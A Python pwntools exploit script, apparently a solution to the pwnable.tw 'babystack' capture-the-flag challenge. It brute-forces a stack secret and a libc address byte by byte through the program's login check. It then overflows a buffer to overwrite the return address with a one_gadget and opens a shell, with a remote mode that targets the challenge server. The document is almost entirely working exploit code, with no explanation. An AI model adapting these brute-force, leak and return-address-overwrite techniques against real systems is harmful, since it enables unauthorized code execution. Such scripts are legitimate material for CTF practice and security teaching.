from pwn import *
import pdb

DEBUG = True

# context.proxy = (socks.HTTP, '192.168.152.1', 19999)

if DEBUG:
    p = process('/home/len/pwnable/babystack')
    e = ELF('/home/len/pwnable/glibcs/glibcs/lib/libc.so.6')
else:
    p = remote('chall.pwnable.tw', 10205)
    e = ELF('/home/len/pwnable/libc_64.so.6')

one_offset=0xf0567


def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def login(pwd,lo=True):
    if lo:
        se('1'+'a'*15)
    else:
        se('1')
    ru('Your passowrd :')
    se(pwd)
    return ru('>> ')

def logout():
    se('1')
    ru('>> ')

def copy(content):
    se('3'+'a'*15)
    ru('Copy :')
    se(content)
    ru('>> ')

def Exit():
    se('2')

def guess(length,secret=''):
    for i in range(length):
        for q in range(1,256):
            if 'Success' in login(secret+chr(q)+'\n',False):
                secret+=chr(q)
                logout()
                break
    return secret

secret=guess(16)

pdb.set_trace()
login('\x00'+'a'*0x57)
copy('b'*40)
logout()
p.interactive()
base=u64(guess(6,'a'*16+'1'+'a'*7)[24:]+'\x00\x00')-324-e.symbols['setvbuf']
one_gadget=base+one_offset
payload='\x00'+'a'*63+secret+'a'*24+p64(one_gadget)
login(payload)
copy('a'*0x30)
Exit()
print(hex(base))

p.interactive()
